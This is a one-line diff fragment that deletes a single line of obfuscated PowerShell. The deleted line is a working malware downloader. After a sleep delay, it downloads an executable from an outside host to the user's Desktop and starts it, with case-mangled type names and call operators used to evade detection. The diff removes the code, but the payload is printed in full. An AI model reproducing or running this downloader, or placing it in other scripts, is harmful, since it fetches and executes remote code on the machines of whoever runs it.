@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'eNvIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gEtfoLdeRpATh('Desktop');(&'New-Object' 'System.Net.WebClIent').dOwNLOaDfiLE.INVokE('http://momerton.com/atsms','$Des\9404541.exe');&'Start-Process' $Des\9404541.exe
